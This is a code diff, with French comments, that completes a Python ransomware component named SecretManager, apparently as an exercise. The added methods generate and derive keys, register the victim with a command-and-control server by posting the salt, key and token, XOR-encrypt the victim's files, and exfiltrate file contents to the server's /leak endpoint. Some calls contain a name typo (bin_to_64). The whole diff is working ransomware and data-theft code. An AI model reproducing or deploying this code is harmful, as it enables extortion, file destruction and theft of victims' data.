@@ -34,49 +34,79 @@ class SecretManager:
                 algorithm=hashes.SHA256(), #renforce la sécurité
                 length=self.KEY_LENGTH, #longueur de la clé finale
                 salt=salt, #utilisation du sel
+                iterations=self.ITERATION
+        )
+        return kdf.derive(key)
                 
 
 
     def create(self)->Tuple[bytes, bytes, bytes]:
-        raise NotImplemented()
-
+        salt= secrets.token_bytes(self.SALT_LENGTH) #génération  d'un sel aléatoire
+        key= secrets.token_bytes(self.KEY_LENGTH) # génération d'une clé aléatoire
+        token= self.do_derivation(salt, key) #utilisation du sel et de la clé pour dériver un token
+        return salt, key, token
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        raise NotImplemented()
+        data = {
+                "token": self.bin_to_64(token),
+                "salt": self.bin_to_64(salt),
+                "key": self.bin_to_64(key),
+            }
+        requests.post(f"http://{self._remote_host_port}/new", json=data) #envoi des données au cnc
 
     def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+        os.makedirs(self._path, exist_ok=True) #crée le répertoire s'il n'existe pas 
+        token_path= os.path.join(self._path, "token.bin") #chemin du fichier du token
+        if os.path.exists(token_path):
+            return #si le fichier existe déja, ne rien faire alors
+        
+        salt, key, token = self.create() #génération des clés et du token
+        
+        with open(token_path, "wb") as f:
+            f.write(token) #enregistrement du token
+        with open(os.path.join(self._path, "salt.bin"), "wb") as f:
+            f.write(salt) #enregistrement du sel
+        
+        self.post_new(salt, key, token) #envoi des clés au serveur cnc
 
     def load(self)->None:
-        # function to load crypto data
-        raise NotImplemented()
+        with open(os.path.join(self._path, "token.bin"), "rb") as f:
+            self._token = f.read() #lecture du token
+        with open(os.path.join(self._path, "salt.bin"), "rb") as f:
+            self._salt = f.read() #lecture du sel
+        
 
     def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
-        raise NotImplemented()
+        return self.do_derivation(self._salt, candidate_key) == self._token #compare la dérivée au token
 
     def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        raise NotImplemented()
+        key = base64.b64decode(b64_key) # convertit la clé 64 en bytes
+        if not self.check_key(key):
+            raise ValueError("invalid key") # érreur si la clé est incorrecte
+        self._key = key # stocke la clé pour le chiffrement/déchiffrement
 
     def get_hex_token(self)->str:
-        # Should return a string composed of hex symbole, regarding the token
-        raise NotImplemented()
+        return sha256(self._token).hexdigest() #hachage SHA256 du token
 
     def xorfiles(self, files:List[str])->None:
-        # xor a list for file
-        raise NotImplemented()
+        for file in files:
+            xorfile(file, self._key) #chiffre ou déchiffre chaque fichier avec la clé stockée
 
     def leak_files(self, files:List[str])->None:
-        # send file, geniune path and token to the CNC
-        raise NotImplemented()
+        for file in files:
+            with open(file, "rb") as f:
+                encoded_data = self.bin_to_64(f.read()) #convertit le fichier en base64
+            data = {
+                "token": self.bin_to_b64(self._token),
+                "filename": os.path.basename(file),
+                "data": encoded_data,
+            }
+            requests.post(f"http://{self._remote_host_port}/leak", json=data) #encoi au cnc
 
     def clean(self):
-        # remove crypto data from the target
-        raise NotImplemented()
+        os.remove(os.path.join(self._path, "token.bin")) #supprime le token
+        os.remove(os.path.join(self._path, "salt.bin")) #supprime le sel
